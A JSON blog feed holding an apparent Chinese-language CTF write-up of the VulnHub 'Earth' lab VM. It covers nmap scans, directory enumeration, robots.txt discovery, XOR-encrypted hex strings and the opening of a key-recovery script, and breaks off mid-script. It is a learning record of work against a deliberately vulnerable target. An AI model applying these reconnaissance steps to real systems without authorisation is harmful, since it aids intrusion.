{
    "version": "https://jsonfeed.org/version/1",
    "title": "Glad to see U (◦˙▽˙◦)",
    "subtitle": "With Great Power Comes Great Responsibilities",
    "icon": "https://ctf-learner.github.io/assets/favicon.ico",
    "description": "With Great Power Comes Great Responsibilities",
    "home_page_url": "https://ctf-learner.github.io",
    "items": [
        {
            "id": "https://ctf-learner.github.io/post/Get-Earth-Shell/",
            "url": "https://ctf-learner.github.io/post/Get-Earth-Shell/",
            "title": "Get Earth Shell",
            "date_published": "2024-05-05T12:45:35.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-05-05</span></p>\n<p>行星系列靶机 ———Earth。</p>\n<p>新手的第二次实战，学到的都是满满的知识，一路上走了许多弯路，不认识框架，看不懂 Linux 的权限机制，越权时找不到方向等等等等，在未知中摸索，享受 blackbox 的乐趣，未来的路很长，肩上的担子还很重。</p>\n<p><a href=\"https://www.vulnhub.com/entry/the-planets-earth,755/\">The Planets: Earth ~ VulnHub</a></p>\n<p>Earth 靶机下载：<a href=\"https://download.vulnhub.com/theplanets/Earth.ova\">https://download.vulnhub.com/theplanets/Earth.ova</a></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240502230855254.png\" alt=\"image-20240502230855254\" /></p>\n<p>kali ip 地址：192.168.81.129</p>\n<h1 id=\"主机发现\"><a class=\"anchor\" href=\"#主机发现\">#</a> 主机发现</h1>\n<p>老样子，先 nmap 简单扫一下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>对照mac地址寻找ip</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─$ nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">192.168</span>.81.0/24</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-02 <span class=\"token number\">11</span>:11 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0026s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:08 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00032s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:50:56:E2:03:BD <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr class=\"marked\"><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.131     <span class=\"token comment\">#  Earth 靶机 ip 地址</span></pre></td></tr><tr class=\"marked\"><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00085s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr class=\"marked\"><td data-num=\"11\"></td><td><pre>MAC Address: 00:50:56:2B:3B:46 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 发现 mac 地址，锁定这就是靶机</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.254</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00037s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>MAC Address: 00:50:56:E9:20:9C <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.129</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">4.34</span> seconds</pre></td></tr></table></figure><p>然后深度扫描一下端口：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>深度扫描</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─$ nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-A</span> <span class=\"token number\">192.168</span>.81.131    <span class=\"token comment\">#  -sV -A  扫描系统版本和开启端口的服务</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-02 <span class=\"token number\">11</span>:13 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.131</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0013s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">987</span> filtered tcp ports <span class=\"token punctuation\">(</span>no-response<span class=\"token punctuation\">)</span>, <span class=\"token number\">10</span> filtered tcp ports <span class=\"token punctuation\">(</span>admin-prohibited<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT    STATE SERVICE  VERSION</pre></td></tr><tr class=\"marked\"><td data-num=\"7\"></td><td><pre><span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>      OpenSSH <span class=\"token number\">8.6</span> <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> ssh-hostkey: </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span></pre></td></tr><tr class=\"marked\"><td data-num=\"11\"></td><td><pre><span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http     Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token punctuation\">((</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Bad Request <span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#  apache 服务器 python 版本 3.9</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.4.51 <span class=\"token punctuation\">(</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr class=\"marked\"><td data-num=\"14\"></td><td><pre><span class=\"token number\">443</span>/tcp <span class=\"token function\">open</span>  ssl/http Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token punctuation\">((</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.4.51 <span class=\"token punctuation\">(</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span> tls-alpn: </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span>_  http/1.1</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Bad Request <span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>earth.local/stateOrProvinceName<span class=\"token operator\">=</span>Space</pre></td></tr><tr class=\"marked\"><td data-num=\"21\"></td><td><pre><span class=\"token operator\">|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local   //  没仔细看就漏了这里</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">|</span> Not valid before: <span class=\"token number\">2021</span>-10-12T23:26:31</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span>_Not valid after:  <span class=\"token number\">2031</span>-10-10T23:26:31</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>MAC Address: 00:50:56:2B:3B:46 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Warning: OSScan results may be unreliable because we could not <span class=\"token function\">find</span> at least <span class=\"token number\">1</span> <span class=\"token function\">open</span> and <span class=\"token number\">1</span> closed port</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Device type: general purpose<span class=\"token operator\">|</span>storage-misc   <span class=\"token comment\">#  设备类型</span></pre></td></tr><tr class=\"marked\"><td data-num=\"27\"></td><td><pre>Running <span class=\"token punctuation\">(</span>JUST GUESSING<span class=\"token punctuation\">)</span>: Linux <span class=\"token number\">4</span>.X<span class=\"token operator\">|</span><span class=\"token number\">5</span>.X<span class=\"token operator\">|</span><span class=\"token number\">2.6</span>.X<span class=\"token operator\">|</span><span class=\"token number\">3</span>.X <span class=\"token punctuation\">(</span><span class=\"token number\">97</span>%<span class=\"token punctuation\">)</span>, Synology DiskStation Manager <span class=\"token number\">5</span>.X <span class=\"token punctuation\">(</span><span class=\"token number\">90</span>%<span class=\"token punctuation\">)</span>, Netgear RAIDiator <span class=\"token number\">4</span>.X <span class=\"token punctuation\">(</span><span class=\"token number\">87</span>%<span class=\"token punctuation\">)</span>    <span class=\"token comment\">#  系统运行内核版本</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Aggressive OS guesses: Linux <span class=\"token number\">4.15</span> - <span class=\"token number\">5.8</span> <span class=\"token punctuation\">(</span><span class=\"token number\">97</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">5.0</span> - <span class=\"token number\">5.4</span> <span class=\"token punctuation\">(</span><span class=\"token number\">97</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">5.0</span> - <span class=\"token number\">5.5</span> <span class=\"token punctuation\">(</span><span class=\"token number\">95</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">2.6</span>.32 <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">3.10</span> - <span class=\"token number\">4.11</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">4.9</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">3.4</span> - <span class=\"token number\">3.10</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">5.1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">2.6</span>.32 - <span class=\"token number\">3.10</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">2.6</span>.32 - <span class=\"token number\">3.13</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>No exact OS matches <span class=\"token keyword\">for</span> <span class=\"token function\">host</span> <span class=\"token punctuation\">(</span>test conditions non-ideal<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">1.29</span> ms <span class=\"token number\">192.168</span>.81.131</pre></td></tr></table></figure><p>很不幸，80 端口和 443 端口都报 400，并且靶机系统内核的版本号也不确定。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240502232516042.png\" alt=\"image-20240502232516042\" /></p>\n<p>出师不利。关注到有一个不寻常的位置👇：</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503124531809.png\" alt=\"image-20240503124531809\" /></p>\n<h1 id=\"绕了一堆弯子\"><a class=\"anchor\" href=\"#绕了一堆弯子\">#</a> 绕了一堆弯子</h1>\n<p>这个 mod_wsgi 是个什么东西？看看这里👉<a href=\"https://www.liaoxuefeng.com/wiki/1016959663602400/1017805733037760\">WSGI 接口 - 廖雪峰的官方网站 (liaoxuefeng.com)</a></p>\n<p>通俗理解：实际上 WSGI 是底层处理 TCP 连接、HTTP 原始请求和响应格式统一的接口。Flask 底层使用的就是 WSGI 协议。</p>\n<p>然后去看看有没有什么 CVE，搜出来两个结果：</p>\n<p>①目录穿越漏洞，用 %2f 绕过 /，可以任意文件读取。👇</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503125209575.png\" alt=\"image-20240503125209575\" /></p>\n<p>试了一串没有什么作用。</p>\n<p>②CVE-2014-0240</p>\n<blockquote>\n<p>当启用守护程序模式时，Apache 的 3.5 之前的 mod_wsgi 模块在某些 Linux 内核上运行时无法正确处理 setuid 返回的错误代码，这允许本地用户通过与正在运行的进程数量相关的向量获得权限。</p>\n</blockquote>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503130323202.png\" alt=\"image-20240503130323202\" /></p>\n<p>搜了好多，没有复现文字，并且还没到越权那一步。msf search 也没有搜索到</p>\n<p>同时 dirsearch 也跑了一下，依然一无所获。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503130743214.png\" alt=\"image-20240503130743214\" /></p>\n<p>没招了，用 Nessus 试一下。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503185129589.png\" alt=\"image-20240503185129589\" /></p>\n<p>打开看到有几个重大漏洞，还是没有找到利用的入口。</p>\n<h1 id=\"dns域名解析问题\"><a class=\"anchor\" href=\"#dns域名解析问题\">#</a> DNS 域名解析问题</h1>\n<p>只能搜一下 wp，才发现自己遗漏了这个点👇<span class=\"spoiler\" title=\"你知道得太多了\">没什么经验，大佬勿喷</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>第八行DNS解析</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">443</span>/tcp <span class=\"token function\">open</span>  ssl/http Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token punctuation\">((</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.4.51 <span class=\"token punctuation\">(</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">|</span> tls-alpn: </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span>_  http/1.1</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Bad Request <span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>earth.local/stateOrProvinceName<span class=\"token operator\">=</span>Space</pre></td></tr><tr class=\"marked\"><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local   <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span></pre></td></tr></table></figure><p>才发现用 ip 地址是无法正常访问，需要添加 DNS 解析。</p>\n<p>所以修改 hosts 文件（本机的或者 kali 的），路径： <code>C:\\Windows\\System32\\drivers\\etc</code> （ <code>/etc/hosts</code> ）</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>192.168.81.131 earth.local</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>192.168.81.131  terratest.earth.local</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503131304539.png\" alt=\"image-20240503131304539\" /></p>\n<p>修改完一般会立即生效，若没生效可以在 powershell 或者 cmd 中刷新 DNS 解析配置：   <code>ipconfig /flushdns</code></p>\n<h1 id=\"反向代理证书验证\"><a class=\"anchor\" href=\"#反向代理证书验证\">#</a> 反向代理？！证书验证？！</h1>\n<p>出于好奇我也搜了一下原因：</p>\n<p>🤖GPT: 可能的原因有👇</p>\n<ol>\n<li class=\"lvl-3\">\n<p><strong>证书验证</strong>：如前所述，如果服务器配置了 SSL/TLS 证书，并且证书中包含了域名作为主题备用名称（SAN），那么使用域名访问时，浏览器或客户端能够验证服务器的身份。而直接使用 IP 地址访问时，由于缺乏域名信息，SSL/TLS 证书的验证可能会失败，导致 400 错误。</p>\n</li>\n<li class=\"lvl-3\">\n<p><strong>防火墙或安全规则</strong>：服务器的防火墙或安全规则可能配置为仅接受来自特定域名的请求，而拒绝来自 IP 地址的请求。</p>\n</li>\n<li class=\"lvl-3\">\n<p><strong>服务器负载均衡器或反向代理</strong>：如果服务器后端使用了负载均衡器或反向代理，它们可能根据请求的域名来决定如何路由请求，而直接使用 IP 地址可能不会经过相同的路由逻辑。</p>\n</li>\n</ol>\n<details class=\"info\"><summary>反向代理是什么鬼？</summary><div>\n<p>先说正向代理：</p>\n<p>正常代理服务器（中间人）一般在客户端到服务器之间。</p>\n<blockquote>\n<p>浏览器（客户端） ----(request)----&gt;    中间人（代理服务器）------&gt;  目标服务器    ----------&gt;   中间人（代理服务器）-----(response)----&gt; 浏览器（客户端）</p>\n</blockquote>\n<p>黄牛抢票，中介卖房，上课传纸条…… 都是正向代理。<strong>正向代理，其实是 &quot;代理服务器&quot; 代理了 &quot;客户端&quot;，去和 &quot;目标服务器&quot; 进行交互。</strong></p>\n<p>正向代理可以：突破访问限制、提高访问速度、隐藏客户端真实 IP。</p>\n<p><strong>那么反向代理就是：</strong></p>\n<blockquote>\n<p>浏览器（客户端） ----(request)----&gt; 中转服务器 ---(Request parsing)---&gt;  目标服务器    ---(response)----&gt; 浏览器（客户端）</p>\n</blockquote>\n<p>而反向代理是在请求到达服务器之后，<strong>&quot;代理服务器&quot; 代表了 &quot;目标服务器&quot;，去和 &quot;客户端&quot; 进行交互。</strong></p>\n<p>因此在这里请求 ip 地址 <code>192.168.81.131</code>  有可能不是服务器真实的地址，而是一个 nginx 代理服务器或者是一个 DNS 解析服务器，而我们的域名到达后再解析到对应的服务上；也有可能是虚拟主机……</p>\n</div></details>\n<p><a href=\"https://blog.csdn.net/gui951753/article/details/83070180\">为什么域名能够访问网站，而直接使用 IP 不可以_不做域名解析直接用公网 ip 访问可否 - CSDN 博客</a></p>\n<p>但是 —— 这里似乎是 SSL 证书问题（用 python 请求域名地址就会提示证书问题……）</p>\n<h1 id=\"xor初探\"><a class=\"anchor\" href=\"#xor初探\">#</a> XOR 初探</h1>\n<p>折腾完，访问一下终于正常了：</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503134311209.png\" alt=\"image-20240503134311209\" /></p>\n<p>下面有很长串的字符贴在这里，划都划不到尽头。一眼扫过字母都是在 a-f，有可能是 16 进制，但是转码出来是乱码。</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</pre></td></tr></table></figure><figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</pre></td></tr></table></figure><figure class=\"highlight text\"><figcaption data-lang=\"text\"><span>重点关注！</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</pre></td></tr></table></figure><p>用 dirsearch 扫目录发现 admin 路由 301，估计被重定向到验证登录界面了。</p>\n<p>让 sqlmap 在后台跑着先，换另一个域名找找线索。 <code>http://terratest.earth.local/</code></p>\n<p>打开的界面是一样的。还是扫一扫目录看看。结果和前面是一样的，难道两个域名下服务都是一样的？</p>\n<p>然后我又用 nmap 扫了两个域名，两个域名都开放了 22，80，443 端口。于是我改成用 https 协议访问了一下。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503184626790.png\" alt=\"image-20240503184626790\" /></p>\n<p>测试站点让我忽略？我信你个鬼你个糟老头子坏得很。测试站点感觉有源码泄露的可能。先上 dirsearch。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503185241920.png\" alt=\"image-20240503185241920\" /></p>\n<p>果然有玄机。虽然都是 403，但是 200 的 robots.txt 可以访问到。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>看看28、30行</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>User-Agent: *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Disallow: /*.asp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Disallow: /*.aspx</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Disallow: /*.bat</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Disallow: /*.c</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Disallow: /*.cfm</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Disallow: /*.cgi</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Disallow: /*.com</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Disallow: /*.dll</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Disallow: /*.exe</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Disallow: /*.htm</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Disallow: /*.html</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Disallow: /*.inc</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Disallow: /*.jhtml</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Disallow: /*.jsa</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Disallow: /*.json</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Disallow: /*.jsp</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Disallow: /*.log</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Disallow: /*.mdb</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Disallow: /*.nsf</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Disallow: /*.php</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Disallow: /*.phtml</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Disallow: /*.pl</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Disallow: /*.reg</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Disallow: /*.sh</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Disallow: /*.shtml</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Disallow: /*.sql</pre></td></tr><tr class=\"marked\"><td data-num=\"28\"></td><td><pre>Disallow: /*.txt</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Disallow: /*.xml</pre></td></tr><tr class=\"marked\"><td data-num=\"30\"></td><td><pre>Disallow: /testingnotes.*</pre></td></tr></table></figure><p>内容很多，最后有一个文件名，挨个试一下后缀，发现 txt 中有内容👇</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504001554684.png\" alt=\"image-20240504001554684\" /></p>\n<p><mark>消息量巨大</mark>，XOR 其实就是异或运算：<a href=\"https://blog.csdn.net/roc1010/article/details/103227081\">异或 (XOR) 运算加密 - CSDN 博客</a></p>\n<blockquote>\n<p>明文 XOR key ==&gt; 密文      密文 XOR key ==&gt; 明文</p>\n</blockquote>\n<p>访问 testdata.txt 得到一串英文，写个脚本试一下能不能试出来 key 是什么。</p>\n<p>用第三串 16 进制字符试一下（因为明文很长，密文应该也很长）</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504134242912.png\" alt=\"image-20240504134242912\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 脚本：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_key</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> ciphertext_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    ciphertext_bytes <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span 